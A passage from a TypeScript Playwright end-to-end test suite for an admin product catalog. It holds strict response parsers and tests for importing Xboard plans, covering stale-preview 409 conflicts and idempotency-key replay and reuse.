    if (seenPeriods.has(offer.period)) {
      throw new Error(`Faka preview response: duplicate period "${offer.period}" in offers`);
    }
    seenPeriods.add(offer.period);
    if (typeof offer.sku !== 'string' || offer.sku.length === 0) {
      throw new Error('Faka preview response: offers item sku must be a non-empty string');
    }
    if (seenSkus.has(offer.sku)) {
      throw new Error(`Faka preview response: duplicate sku "${offer.sku}" in offers`);
    }
    seenSkus.add(offer.sku);
    if (typeof offer.offerName !== 'string' || offer.offerName.length === 0) {
      throw new Error('Faka preview response: offers item offerName must be a non-empty string');
    }
    if (!isPositiveInteger(offer.pricePoints)) {
      throw new Error('Faka preview response: offers item pricePoints must be a positive integer');
    }
    if (offer.validityDays !== null && !isPositiveInteger(offer.validityDays)) {
      throw new Error('Faka preview response: offers item validityDays must be a positive integer or null');
    }
    parsedOffers.push({
      period: offer.period,
      sku: offer.sku,
      offerName: offer.offerName,
      pricePoints: offer.pricePoints,
      validityDays: offer.validityDays,
    });
  }
  const offers = parsedOffers;

  if (!Array.isArray(value.issues)) {
    throw new Error('Faka preview response: issues must be an array');
  }
  const rawIssues: unknown[] = value.issues;
  const parsedIssues: FakaPreviewIssue[] = [];
  for (const issue of rawIssues) {
    const hasAction = isRecord(issue) && Object.prototype.hasOwnProperty.call(issue, 'action');
    assertExactKeys(
      issue,
      hasAction ? ['code', 'field', 'message', 'action'] : ['code', 'field', 'message'],
      'Faka preview response: issues item',
    );
    if (typeof issue.code !== 'string' || issue.code.length === 0) {
      throw new Error('Faka preview response: issues item code must be a non-empty string');
    }
    if (typeof issue.field !== 'string' || issue.field.length === 0) {
      throw new Error('Faka preview response: issues item field must be a non-empty string');
    }
    if (typeof issue.message !== 'string' || issue.message.length === 0) {
      throw new Error('Faka preview response: issues item message must be a non-empty string');
    }
    if (hasAction && (typeof issue.action !== 'string' || issue.action.length === 0)) {
      throw new Error('Faka preview response: issues item action must be a non-empty string when present');
    }
    parsedIssues.push({
      code: issue.code,
      field: issue.field,
      message: issue.message,
      ...(hasAction ? { action: issue.action as string } : {}),
    });
  }

  return {
    sourceHash: value.sourceHash,
    capacity: {
      limit: value.capacity.limit,
      activeUsers: value.capacity.activeUsers,
      remaining: value.capacity.remaining,
      sellable: value.capacity.sellable,
    },
    productName: value.productName,
    plainDescription: value.plainDescription,
    richDescription: value.richDescription,
    cover,
    offers,
    issues: parsedIssues,
    canConfirm: value.canConfirm,
    existingProductId: value.existingProductId,
    archived: value.archived,
    suggestedActions,
  };
}

// ---------------------------------------------------------------------------
// Faka import response parser + idempotency key
// ---------------------------------------------------------------------------

export interface FakaImportResponseOffer {
  period: string;
  sku: string;
  offerName: string;
  pricePoints: number;
  validityDays: number | null;
}

export interface FakaImportResponse {
  productId: number;
  offerCount: number;
  offers: FakaImportResponseOffer[];
  replayed: boolean;
}

/**
 * Reads the mandatory `idempotency-key` request header and validates it.
 * The value must be a string; after trimming OWS (space/tab) it must match
 * `[A-Za-z0-9._:-]{1,128}`. Returns the trimmed value, otherwise throws.
 */
export function readIdempotencyKey(request: Request): string {
  const header = request.headers()['idempotency-key'];
  if (typeof header !== 'string') {
    throw new Error('idempotency-key header is required');
  }
  const trimmed = header.replace(/^[ \t]+|[ \t]+$/g, '');
  if (!/^[A-Za-z0-9._:-]{1,128}$/.test(trimmed)) {
    throw new Error('idempotency-key header must match [A-Za-z0-9._:-]{1,128}');
  }
  return trimmed;
}

/**
 * Strictly parses the first Faka import response payload.
 * Top level must be exactly { productId, offerCount, offers, replayed }:
 *   - productId: positive integer
 *   - offerCount: positive integer
 *   - replayed: boolean (the parser does not enforce a specific value; the
 *     test asserts the expected replay semantics)
 *   - offers: array whose length must equal offerCount; each item exactly
 *     { period, sku, offerName, pricePoints, validityDays } with non-empty
 *     period/sku/offerName, positive integer pricePoints, validityDays as a
 *     positive integer or null, and period/sku each unique across items
 * Rejects any extra key. Returns a fully typed object.
 */
export function parseFakaImportResponse(value: unknown): FakaImportResponse {
  assertExactKeys(
    value,
    ['productId', 'offerCount', 'offers', 'replayed'],
    'Faka import response',
  );

  if (!isPositiveInteger(value.productId)) {
    throw new Error('Faka import response: productId must be a positive integer');
  }
  if (!isPositiveInteger(value.offerCount)) {
    throw new Error('Faka import response: offerCount must be a positive integer');
  }
  if (typeof value.replayed !== 'boolean') {
    throw new Error('Faka import response: replayed must be a boolean');
  }

  if (!Array.isArray(value.offers)) {
    throw new Error('Faka import response: offers must be an array');
  }
  const rawOffers: unknown[] = value.offers;
  if (rawOffers.length !== value.offerCount) {
    throw new Error('Faka import response: offers.length must equal offerCount');
  }

  const seenPeriods = new Set<string>();
  const seenSkus = new Set<string>();
  const parsedOffers: FakaImportResponseOffer[] = [];
  for (const offer of rawOffers) {
    assertExactKeys(
      offer,
      ['period', 'sku', 'offerName', 'pricePoints', 'validityDays'],
      'Faka import response: offers item',
    );
    if (typeof offer.period !== 'string' || offer.period.length === 0) {
      throw new Error('Faka import response: offers item period must be a non-empty string');
    }
    if (seenPeriods.has(offer.period)) {
      throw new Error(`Faka import response: duplicate period "${offer.period}" in offers`);
    }
    seenPeriods.add(offer.period);
    if (typeof offer.sku !== 'string' || offer.sku.length === 0) {
      throw new Error('Faka import response: offers item sku must be a non-empty string');
    }
    if (seenSkus.has(offer.sku)) {
      throw new Error(`Faka import response: duplicate sku "${offer.sku}" in offers`);
    }
    seenSkus.add(offer.sku);
    if (typeof offer.offerName !== 'string' || offer.offerName.length === 0) {
      throw new Error('Faka import response: offers item offerName must be a non-empty string');
    }
    if (!isPositiveInteger(offer.pricePoints)) {
      throw new Error('Faka import response: offers item pricePoints must be a positive integer');
    }
    if (offer.validityDays !== null && !isPositiveInteger(offer.validityDays)) {
      throw new Error('Faka import response: offers item validityDays must be a positive integer or null');
    }
    parsedOffers.push({
      period: offer.period,
      sku: offer.sku,
      offerName: offer.offerName,
      pricePoints: offer.pricePoints,
      validityDays: offer.validityDays,
    });
  }

  return {
    productId: value.productId,
    offerCount: value.offerCount,
    offers: parsedOffers,
    replayed: value.replayed,
  };
}

export interface FakaReplayResponse {
  productId: number;
  replayed: true;
}

/**
 * Strictly parses an idempotent replay response payload.
 * A replay returns exactly { productId, replayed: true } — without the
 * offerCount/offers that a fresh create carries — so this parser is
 * independent of parseFakaImportResponse:
 *   - productId: positive integer
 *   - replayed: must be exactly true
 * Rejects any extra key and any replayed value other than true.
 */
export function parseFakaReplayResponse(value: unknown): FakaReplayResponse {
  assertExactKeys(value, ['productId', 'replayed'], 'Faka replay response');
  if (!isPositiveInteger(value.productId)) {
    throw new Error('Faka replay response: productId must be a positive integer');
  }
  if (value.replayed !== true) {
    throw new Error('Faka replay response: replayed must be exactly true');
  }
  return { productId: value.productId, replayed: true };
}

// ---------------------------------------------------------------------------
// Faka import conflict error parser (409)
// ---------------------------------------------------------------------------

export interface FakaConflictError {
  requestId: string | null;
  code: string;
  message: string;
}

/**
 * Strictly parses a Faka import 409 conflict error payload.
 * The top level may carry exactly { error } plus an optional { requestId } —
 * no other top-level key is allowed. `error` must be exactly { code, message }:
 * the FAKA_SOURCE_CHANGED conflict never carries `details`, so a `details` key
 * is rejected. code/message must be non-empty strings; requestId, when
 * present, must be a non-empty string. Returns a fully typed object.
 */
export function parseFakaConflictError(value: unknown): FakaConflictError {
  if (!isRecord(value)) {
    throw new Error('Faka import conflict error: expected a plain object');
  }
  const actualKeys = Object.keys(value);
  const unexpectedKeys = actualKeys.filter((key) => key !== 'error' && key !== 'requestId');
  if (unexpectedKeys.length > 0) {
    throw new Error(
      `Faka import conflict error: unexpected top-level keys [${unexpectedKeys.join(', ')}]`,
    );
  }
  if (!Object.prototype.hasOwnProperty.call(value, 'error')) {
    throw new Error('Faka import conflict error: missing "error"');
  }

  let requestId: string | null = null;
  if (Object.prototype.hasOwnProperty.call(value, 'requestId')) {
    if (typeof value.requestId !== 'string' || value.requestId.length === 0) {
      throw new Error('Faka import conflict error: requestId must be a non-empty string when present');
    }
    requestId = value.requestId;
  }

  assertExactKeys(value.error, ['code', 'message'], 'Faka import conflict error: error');
  if (typeof value.error.code !== 'string' || value.error.code.length === 0) {
    throw new Error('Faka import conflict error: error.code must be a non-empty string');
  }
  if (typeof value.error.message !== 'string' || value.error.message.length === 0) {
    throw new Error('Faka import conflict error: error.message must be a non-empty string');
  }
  return {
    requestId,
    code: value.error.code,
    message: value.error.message,
  };
}

// ---------------------------------------------------------------------------
// Admin products response parser (typed DTO)
// ---------------------------------------------------------------------------

/**
 * Asserts that `value` is a plain record containing at least every key in
 * `required`. Extra keys are allowed — the admin products wire DTO carries
 * fields this card does not care about; every required field is
 * type-validated by the caller.
 */
function assertHasKeys(
  value: unknown,
  required: readonly string[],
  context: string,
): asserts value is Record<string, unknown> {
  if (!isRecord(value)) {
    const kind =
      value === null ? 'null' : Array.isArray(value) ? 'an array' : typeof value;
    throw new Error(`${context}: expected a plain object, got ${kind}`);
  }
  const missing = required.filter((key) => !(key in value));
  if (missing.length > 0) {
    throw new Error(`${context}: missing [${missing.join(', ')}]`);
  }
}

export interface AdminProductCapacityDto {
  sku: string;
  planId: number | null;
  capacityLimit: number | null;
  activeUsers: number | null;
  remaining: number | null;
  sellable: boolean;
  source: 'xboard' | 'unavailable';
}

export interface AdminProductOfferDto {
  id: number;
  name: string;
  status: string;
  isDefault: boolean;
  price: number;
  externalIntegration: string | null;
  externalSku: string | null;
}

export interface AdminProductDto {
  id: number;
  name: string;
  status: string;
  categoryId: number;
  merchantId: number | null;
  imageUrl: string | null;
  images: string[];
  price: number;
  fakaBridge: boolean;
  fakaCapacity: AdminProductCapacityDto | null;
  offers: AdminProductOfferDto[];
}

/**
 * Strictly parses a GET /api/admin/products response body (a JSON array).
 * Server product/offer objects may carry extra keys this card does not care
 * about, but every required field below is type-guarded:
 *   - product: id (positive integer, unique), name (non-empty string),
 *     status (non-empty string), categoryId (positive integer),
 *     merchantId (positive integer or null), imageUrl (non-empty string or
 *     null), images (array of non-empty strings), price (positive integer),
 *     fakaBridge (boolean), fakaCapacity (null or validated snapshot),
 *     offers (array of validated offers)
 *   - fakaCapacity (when not null): sku (non-empty string), planId (positive
 *     integer or null), capacityLimit/activeUsers/remaining (null or
 *     non-negative integer), sellable (boolean), source ("xboard" |
 *     "unavailable"). An optional `reason` is ignored.
 *   - offer: id (positive integer, unique), name (non-empty string), status
 *     (non-empty string), isDefault (boolean), price (positive integer),
 *     externalIntegration/externalSku (string or null).
 * Returns a fully typed minimal DTO.
 */
export function parseAdminProductsResponse(value: unknown): AdminProductDto[] {
  if (!Array.isArray(value)) {
    throw new Error('Admin products response: expected a JSON array');
  }
  const rawProducts: unknown[] = value;

  const parsedProducts: AdminProductDto[] = [];
  const seenProductIds = new Set<number>();

  for (const product of rawProducts) {
    assertHasKeys(
      product,
      [
        'id',
        'name',
        'status',
        'categoryId',
        'merchantId',
        'imageUrl',
        'images',
        'price',
        'fakaBridge',
        'fakaCapacity',
        'offers',
      ],
      'Admin products response: product',
    );

    if (!isPositiveInteger(product.id)) {
      throw new Error('Admin products response: product.id must be a positive integer');
    }
    if (seenProductIds.has(product.id)) {
      throw new Error(`Admin products response: duplicate product id ${product.id}`);
    }
    seenProductIds.add(product.id);

    if (typeof product.name !== 'string' || product.name.length === 0) {
      throw new Error('Admin products response: product.name must be a non-empty string');
    }
    if (typeof product.status !== 'string' || product.status.length === 0) {
      throw new Error('Admin products response: product.status must be a non-empty string');
    }
    if (!isPositiveInteger(product.categoryId)) {
      throw new Error('Admin products response: product.categoryId must be a positive integer');
    }
    if (product.merchantId !== null && !isPositiveInteger(product.merchantId)) {
      throw new Error('Admin products response: product.merchantId must be a positive integer or null');
    }
    if (product.imageUrl !== null && (typeof product.imageUrl !== 'string' || product.imageUrl.length === 0)) {
      throw new Error('Admin products response: product.imageUrl must be a non-empty string or null');
    }
    if (!isPositiveInteger(product.price)) {
      throw new Error('Admin products response: product.price must be a positive integer');
    }
    if (typeof product.fakaBridge !== 'boolean') {
      throw new Error('Admin products response: product.fakaBridge must be a boolean');
    }

    if (!Array.isArray(product.images)) {
      throw new Error('Admin products response: product.images must be an array');
    }
    const rawImages: unknown[] = product.images;
    const images: string[] = [];
    for (const image of rawImages) {
      if (typeof image !== 'string' || image.length === 0) {
        throw new Error('Admin products response: product.images must contain only non-empty strings');
      }
      images.push(image);
    }

    let fakaCapacity: AdminProductCapacityDto | null = null;
    if (product.fakaCapacity !== null) {
      assertHasKeys(
        product.fakaCapacity,
        ['sku', 'planId', 'capacityLimit', 'activeUsers', 'remaining', 'sellable', 'source'],
        'Admin products response: product.fakaCapacity',
      );
      const capacity = product.fakaCapacity;
      if (typeof capacity.sku !== 'string' || capacity.sku.length === 0) {
        throw new Error('Admin products response: fakaCapacity.sku must be a non-empty string');
      }
      if (capacity.planId !== null && !isPositiveInteger(capacity.planId)) {
        throw new Error('Admin products response: fakaCapacity.planId must be a positive integer or null');
      }
      if (!isNullableNonNegativeInteger(capacity.capacityLimit)) {
        throw new Error('Admin products response: fakaCapacity.capacityLimit must be null or a non-negative integer');
      }
      if (!isNullableNonNegativeInteger(capacity.activeUsers)) {
        throw new Error('Admin products response: fakaCapacity.activeUsers must be null or a non-negative integer');
      }
      if (!isNullableNonNegativeInteger(capacity.remaining)) {
        throw new Error('Admin products response: fakaCapacity.remaining must be null or a non-negative integer');
      }
      if (typeof capacity.sellable !== 'boolean') {
        throw new Error('Admin products response: fakaCapacity.sellable must be a boolean');
      }
      if (capacity.source !== 'xboard' && capacity.source !== 'unavailable') {
        throw new Error('Admin products response: fakaCapacity.source must be "xboard" or "unavailable"');
      }
      fakaCapacity = {
        sku: capacity.sku,
        planId: capacity.planId,
        capacityLimit: capacity.capacityLimit,
        activeUsers: capacity.activeUsers,
        remaining: capacity.remaining,
        sellable: capacity.sellable,
        source: capacity.source,
      };
    }

    if (!Array.isArray(product.offers)) {
      throw new Error('Admin products response: product.offers must be an array');
    }
    const rawOffers: unknown[] = product.offers;
    const seenOfferIds = new Set<number>();
    const offers: AdminProductOfferDto[] = [];
    for (const offer of rawOffers) {
      assertHasKeys(
        offer,
        ['id', 'name', 'status', 'isDefault', 'price', 'externalIntegration', 'externalSku'],
        'Admin products response: offers item',
      );
      if (!isPositiveInteger(offer.id)) {
        throw new Error('Admin products response: offers item id must be a positive integer');
      }
      if (seenOfferIds.has(offer.id)) {
        throw new Error(`Admin products response: duplicate offer id ${offer.id}`);
      }
      seenOfferIds.add(offer.id);
      if (typeof offer.name !== 'string' || offer.name.length === 0) {
        throw new Error('Admin products response: offers item name must be a non-empty string');
      }
      if (typeof offer.status !== 'string' || offer.status.length === 0) {
        throw new Error('Admin products response: offers item status must be a non-empty string');
      }
      if (typeof offer.isDefault !== 'boolean') {
        throw new Error('Admin products response: offers item isDefault must be a boolean');
      }
      if (!isPositiveInteger(offer.price)) {
        throw new Error('Admin products response: offers item price must be a positive integer');
      }
      if (offer.externalIntegration !== null && typeof offer.externalIntegration !== 'string') {
        throw new Error('Admin products response: offers item externalIntegration must be a string or null');
      }
      if (offer.externalSku !== null && typeof offer.externalSku !== 'string') {
        throw new Error('Admin products response: offers item externalSku must be a string or null');
      }
      offers.push({
        id: offer.id,
        name: offer.name,
        status: offer.status,
        isDefault: offer.isDefault,
        price: offer.price,
        externalIntegration: offer.externalIntegration,
        externalSku: offer.externalSku,
      });
    }

    parsedProducts.push({
      id: product.id,
      name: product.name,
      status: product.status,
      categoryId: product.categoryId,
      merchantId: product.merchantId,
      imageUrl: product.imageUrl,
      images,
      price: product.price,
      fakaBridge: product.fakaBridge,
      fakaCapacity,
      offers,
    });
  }

  return parsedProducts;
}
export async function ensureNetworkNodeDefaultCoverViaUi(page: Page): Promise<string> {
  const waitForCategoryList = () => page.waitForResponse((response) =>
    response.request().method() === 'GET'
    && new URL(response.url()).pathname === '/api/admin/product-categories'
  );
  const initialListPromise = waitForCategoryList();
  await page.getByRole('button', { name: '目录治理', exact: true }).click();
  let currentList = await initialListPromise;

  const pagination = page.getByTestId('admin-category-pagination');
  await pagination.waitFor({ state: 'visible' });
  let categoryId = '';
  while (true) {
    if (currentList.status() !== 200) throw new Error('category list failed');
    const pageBody: unknown = await currentList.json();
    const networkNodeId = findCategoryIdOnListPage(pageBody, 'network-node');
    if (networkNodeId !== null) {
      categoryId = String(networkNodeId);
      const row = page.getByTestId(`category-row-${categoryId}`);
      await expect(row).toBeVisible({ timeout: 10_000 });
      await expect(row).toContainText('network-node');
      await page.getByTestId(`category-edit-${categoryId}`).click();
      break;
    }
    const nextButton = pagination.getByRole('button', { name: '下一页' });
    if (await nextButton.isDisabled()) throw new Error('network-node category not found');
    const nextListPromise = waitForCategoryList();
    await nextButton.click();
    currentList = await nextListPromise;
  }

  const dialog = page.getByRole('dialog');
  await dialog.waitFor({ state: 'visible' });
  const codeInput = dialog.getByTestId('category-form-code');
  const label = (await dialog.getByTestId('category-form-label').inputValue()).trim();
  const description = (await dialog.getByTestId('category-form-description').inputValue()).trim() || null;
  const sortRaw = await dialog.getByTestId('category-form-sort').inputValue();
  if (await codeInput.inputValue() !== 'network-node' || !(await codeInput.isDisabled())) {
    throw new Error('network-node edit form is invalid');
  }
  if (!label || !/^(0|[1-9][0-9]*)$/.test(sortRaw)) throw new Error('category form is invalid');
  const sortOrder = Number(sortRaw);
  if (!Number.isInteger(sortOrder) || sortOrder < 0 || sortOrder > 1000000) {
    throw new Error('category sort is invalid');
  }

  // The category-cover field is upload-based now (SPEC-CMI-UX-001 §5.4):
  // upload a real image so the network-node category gets a resolvable cover.
  const uploadResponsePromise = page.waitForResponse((response) =>
    response.request().method() === 'POST'
    && new URL(response.url()).pathname === '/api/uploads/image',
  );
  const png = Buffer.from(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
    'base64',
  );
  await dialog.locator('#category-form-cover-file').setInputFiles({ name: 'cover.png', mimeType: 'image/png', buffer: png });
  const uploadResponse = await uploadResponsePromise;
  if (uploadResponse.status() !== 200) throw new Error('cover upload failed');
  const uploadBody: unknown = await uploadResponse.json();
  if (!isRecord(uploadBody) || typeof uploadBody.key !== 'string') {
    throw new Error('cover upload must return { key, url }');
  }
  const objectKey = uploadBody.key;
  const coverUrl = typeof uploadBody.url === 'string' ? uploadBody.url : `http://localhost:3000/uploads/${objectKey}`;
  await expect(dialog.getByTestId('category-form-cover-preview')).toBeVisible();

  let requestCount = 0;
  const onUpdate = (request: Request) => {
    if (request.method() === 'PATCH'
      && new URL(request.url()).pathname === `/api/admin/product-categories/${categoryId}`) {
      requestCount += 1;
    }
  };
  page.on('request', onUpdate);
  try {
    const updatePromise = page.waitForResponse((response) =>
      response.request().method() === 'PATCH'
      && new URL(response.url()).pathname === `/api/admin/product-categories/${categoryId}`
    );
    await dialog.getByTestId('category-form-submit').click();
    const update = await updatePromise;
    if (update.status() !== 200) throw new Error('category update failed');
    const body: unknown = update.request().postDataJSON();
    assertExactKeys(body, ['label', 'description', 'iconKey', 'defaultCover', 'sortOrder'], 'category update request');
    if (body.label !== label || body.description !== description
      || !isRecord(body.defaultCover) || body.defaultCover.kind !== 'upload'
      || body.defaultCover.objectKey !== objectKey
      || body.sortOrder !== sortOrder) {
      throw new Error('category update payload mismatch');
    }
    if (requestCount !== 1) throw new Error('category update duplicate submit');
    await page.locator('[data-toast-card]', { hasText: '分类已更新' }).waitFor({ state: 'visible' });
    await dialog.waitFor({ state: 'detached' });
  } finally {
    page.off('request', onUpdate);
  }
  return coverUrl;
}
test.describe.serial('Catalog Xboard import', () => {
  test('admin rejects a stale Xboard preview with zero product writes', async ({ page }) => {
    await resetXboardFixture();
    try {
      await loginAs(page, SEED_ACCOUNTS.admin);
      await page.goto('/admin');
      await ensureNetworkNodeDefaultCoverViaUi(page);

      // --- Baseline admin products list (real UI read; no gold skus yet) ---
      const baselineProductsPromise = page.waitForResponse(isAdminProductsResponse);
      await page.getByRole('button', { name: '商品与库存', exact: true }).click();
      const baselineProductsResponse = await baselineProductsPromise;
      expect(baselineProductsResponse.status()).toBe(200);
      const baselineBody: unknown = await baselineProductsResponse.json();
      const baselineProducts = parseAdminProductsResponse(baselineBody);
      const baselineExternalSkus = baselineProducts.flatMap((product) =>
        product.offers.map((offer) => offer.externalSku),
      );
      expect(baselineExternalSkus).not.toContain('gold-monthly');
      expect(baselineExternalSkus).not.toContain('gold-yearly');

      // --- Open the real Xboard import UI (catalog + category registry) ---
      const catalogResponsePromise = page.waitForResponse(isCatalogResponse);
      const registryResponsePromise = page.waitForResponse(isAdminCategoriesResponse);
      await page.getByTestId('admin-faka-import-open').click();
      const [catalogResponse, registryResponse] = await Promise.all([
        catalogResponsePromise,
        registryResponsePromise,
      ]);
      expect(catalogResponse.status()).toBe(200);
      expect(registryResponse.status()).toBe(200);

      const catalogBody: unknown = await catalogResponse.json();
      const catalog = parseFakaCatalogResponse(catalogBody);
      const goldPlan = catalog.plans.find((plan) => plan.plan_id === 77);
      if (!goldPlan) {
        throw new Error('Faka catalog is missing plan 77');
      }

      const registryBody: unknown = await registryResponse.json();
      const categories = parseAdminCategoryListResponse(registryBody);
      const networkNode = categories.find((category) => category.code === 'network-node');
      if (!networkNode) {
        throw new Error('active category registry is missing network-node');
      }

      await page.getByTestId('admin-faka-import-plan').selectOption('77');
      await page.getByTestId('product-category-select').selectOption(String(networkNode.id));

      const expectedRequest: FakaImportRequest = {
        planId: 77,
        productName: 'Gold Plan',
        categoryId: networkNode.id,
        cover: { mode: 'category_default' },
        offers: [
          { period: 'monthly', sku: 'gold-monthly', offerName: '月付', pricePoints: 300000 },
          { period: 'yearly', sku: 'gold-yearly', offerName: '年付', pricePoints: 3000000 },
        ],
      };

      // --- Preview the (still unmutated) source, same request as the happy path ---
      const previewResponsePromise = page.waitForResponse(isImportPreviewResponse);
      await page.getByTestId('admin-faka-import-preview-submit').click();
      const previewResponse = await previewResponsePromise;
      expect(previewResponse.status()).toBe(200);
      const previewRequestBody: unknown = previewResponse.request().postDataJSON();
      expect(parseFakaImportRequest(previewRequestBody)).toEqual(expectedRequest);

      const previewBody: unknown = await previewResponse.json();
      const preview = parseFakaPreviewResponse(previewBody);
      expect(preview.sourceHash).toMatch(/^[0-9a-f]{64}$/);
      expect(preview.canConfirm).toBe(true);

      // --- Mutate the fixture source underneath the stale preview ---
      const mutatedSourceHash = await mutateXboardFixture();
      expect(mutatedSourceHash).toMatch(/^[0-9a-f]{64}$/);
      expect(mutatedSourceHash).not.toBe(preview.sourceHash);

      // --- Confirm with the stale sourceHash: exactly one request, 409, zero writes ---
      let confirmRequestCount = 0;
      const onConfirmRequest = (request: Request) => {
        if (
          request.method() === 'POST'
          && new URL(request.url()).pathname === '/api/admin/faka/import'
        ) {
          confirmRequestCount += 1;
        }
      };
      page.on('request', onConfirmRequest);

      try {
        const importResponsePromise = page.waitForResponse(isImportResponse);
        await page.getByTestId('admin-faka-import-submit').click({ clickCount: 2 });
        const importResponse = await importResponsePromise;
        expect(confirmRequestCount).toBe(1);
        expect(importResponse.status()).toBe(409);

        const confirmRequestBody: unknown = importResponse.request().postDataJSON();
        expect(parseFakaConfirmRequest(confirmRequestBody)).toEqual({
          ...expectedRequest,
          sourceHash: preview.sourceHash,
        });
        expect(readIdempotencyKey(importResponse.request())).not.toHaveLength(0);

        const conflictBody: unknown = await importResponse.json();
        const conflict = parseFakaConflictError(conflictBody);
        expect(conflict.code).toBe('FAKA_SOURCE_CHANGED');
        expect(conflict.message).toBe('Xboard 套餐已变化，请重新预览');

        // --- User-visible behaviour: toast + preview cleared, dialog stays open ---
        const sourceChangedToast = page.locator('[data-toast-card]').filter({ hasText: 'Xboard 套餐已变化，请重新预览' });
        await expect(sourceChangedToast).toHaveText('错误：Xboard 套餐已变化，请重新预览');
        await page.getByTestId('admin-faka-preview-result').waitFor({ state: 'detached' });
        await expect(page.getByTestId('admin-faka-import-submit')).toHaveCount(0);
        await expect(page.getByTestId('admin-faka-import-preview')).toBeVisible();
        await expect(page.getByTestId('admin-faka-import-preview-submit')).toBeVisible();
        await expect(page.getByTestId('admin-faka-import-preview-submit')).toBeEnabled();

        // --- Zero-write proof via the real read-only Admin UI (no DB, no reload) ---
        // Close the modal with the real cancel button (pure UI; not a business
        // write), tab-switch, and prove the product list is unchanged.
        await page.getByRole('dialog').getByRole('button', { name: '取消' }).click();
        await page.getByRole('button', { name: '数据仪表盘', exact: true }).click();
        const afterProductsPromise = page.waitForResponse(isAdminProductsResponse);
        await page.getByRole('button', { name: '商品与库存', exact: true }).click();
        const afterProductsResponse = await afterProductsPromise;
        expect(afterProductsResponse.status()).toBe(200);
        const afterBody: unknown = await afterProductsResponse.json();
        const afterProducts = parseAdminProductsResponse(afterBody);

        const baselineProductIds = baselineProducts
          .map((product) => product.id)
          .sort((a, b) => a - b);
        const afterProductIds = afterProducts
          .map((product) => product.id)
          .sort((a, b) => a - b);
        expect(afterProductIds).toEqual(baselineProductIds);

        const afterExternalSkus = afterProducts.flatMap((product) =>
          product.offers.map((offer) => offer.externalSku),
        );
        expect(afterExternalSkus).not.toContain('gold-monthly');
        expect(afterExternalSkus).not.toContain('gold-yearly');
      } finally {
        page.off('request', onConfirmRequest);
      }
    } finally {
      await resetXboardFixture();
    }
  });

  test('admin replays the same Xboard request and rejects idempotency key reuse', async ({ page }) => {
    await resetXboardFixture();

    // All three pages share one BrowserContext (same localStorage/cookies, so
    // the same admin auth). crypto.randomUUID is pinned BEFORE any navigation,
    // which makes every dialog mint the SAME idempotency key. Flow:
    //   - A previews + confirms the standard Gold Plan  -> 201 replayed:false
    //   - B previews + confirms the exact same request  -> 200 replayed:true
    //     (same productId as A)
    //   - C previews after changing only the top-level productName to
    //     "Gold Plan Variant" (offers identical to A/B) and confirms with the
    //     same key but a different body -> 409 IDEMPOTENCY_KEY_REUSED
    // All three previews run before any confirm so every preview stays clean
    // (a plan only becomes "already imported" after A confirms it).
    const FIXED_IDEMPOTENCY_KEY = '00000000-0000-4000-8000-000000000077';
    const pinRandomUuid = (): void => {
      if (typeof window.crypto === 'object' && window.crypto !== null) {
        Object.defineProperty(window.crypto, 'randomUUID', {
          configurable: true,
          value: () => '00000000-0000-4000-8000-000000000077',
        });
      }
    };
    await page.addInitScript(pinRandomUuid);

    const pageB = await page.context().newPage();
    const pageC = await page.context().newPage();
    await pageB.addInitScript(pinRandomUuid);
    await pageC.addInitScript(pinRandomUuid);

    let productIdA = 0;
    try {
      // ===== Page A: admin setup + baseline products read =====
      await loginAs(page, SEED_ACCOUNTS.admin);
      await page.goto('/admin');
      await ensureNetworkNodeDefaultCoverViaUi(page);

      const baselineProductsPromise = page.waitForResponse(isAdminProductsResponse);
      await page.getByRole('button', { name: '商品与库存', exact: true }).click();
      const baselineProductsResponse = await baselineProductsPromise;
      expect(baselineProductsResponse.status()).toBe(200);
      const baselineBody: unknown = await baselineProductsResponse.json();
      const baselineProducts = parseAdminProductsResponse(baselineBody);

      // ===== Shared Gold Plan inputs (A/B identical; C changes only productName) =====
      const aCatalogPromise = page.waitForResponse(isCatalogResponse);
      const aRegistryPromise = page.waitForResponse(isAdminCategoriesResponse);
      await page.getByTestId('admin-faka-import-open').click();
      const [aCatalogResponse, aRegistryResponse] = await Promise.all([
        aCatalogPromise,
        aRegistryPromise,
      ]);
      expect(aCatalogResponse.status()).toBe(200);
      expect(aRegistryResponse.status()).toBe(200);
      const aCatalogBody: unknown = await aCatalogResponse.json();
      const aCatalog = parseFakaCatalogResponse(aCatalogBody);
      const goldPlan = aCatalog.plans.find((plan) => plan.plan_id === 77);
      if (!goldPlan) {
        throw new Error('Faka catalog is missing plan 77');
      }
      const aRegistryBody: unknown = await aRegistryResponse.json();
      const aCategories = parseAdminCategoryListResponse(aRegistryBody);
      const networkNode = aCategories.find((category) => category.code === 'network-node');
      if (!networkNode) {
        throw new Error('active category registry is missing network-node');
      }

      const goldRequest = (productName: string): FakaImportRequest => ({
        planId: 77,
        productName,
        categoryId: networkNode.id,
        cover: { mode: 'category_default' },
        offers: [
          { period: 'monthly', sku: 'gold-monthly', offerName: '月付', pricePoints: 300000 },
          { period: 'yearly', sku: 'gold-yearly', offerName: '年付', pricePoints: 3000000 },
        ],
      });

      // ===== Page A: preview only (no confirm yet) =====
      await page.getByTestId('admin-faka-import-plan').selectOption('77');
      await page.getByTestId('product-category-select').selectOption(String(networkNode.id));
      const aRequest = goldRequest('Gold Plan');
      const aPreviewResponsePromise = page.waitForResponse(isImportPreviewResponse);
      await page.getByTestId('admin-faka-import-preview-submit').click();
      const aPreviewResponse = await aPreviewResponsePromise;
      expect(aPreviewResponse.status()).toBe(200);
      const aPreviewRequestBody: unknown = aPreviewResponse.request().postDataJSON();
      expect(parseFakaImportRequest(aPreviewRequestBody)).toEqual(aRequest);
      const aPreviewBody: unknown = await aPreviewResponse.json();
      const aPreview = parseFakaPreviewResponse(aPreviewBody);
      expect(aPreview.canConfirm).toBe(true);
      expect(aPreview.offers[0]!.offerName).toBe('月付');

      // ===== Page B: same Gold Plan request, previewed before any confirm =====
      await pageB.goto('/admin');
      await pageB.getByRole('button', { name: '商品与库存', exact: true }).click();
      const bCatalogPromise = pageB.waitForResponse(isCatalogResponse);
      const bRegistryPromise = pageB.waitForResponse(isAdminCategoriesResponse);
      await pageB.getByTestId('admin-faka-import-open').click();
      const [bCatalogResponse, bRegistryResponse] = await Promise.all([
        bCatalogPromise,
        bRegistryPromise,
      ]);
      expect(bCatalogResponse.status()).toBe(200);
      expect(bRegistryResponse.status()).toBe(200);
      await pageB.getByTestId('admin-faka-import-plan').selectOption('77');
      await pageB.getByTestId('product-category-select').selectOption(String(networkNode.id));
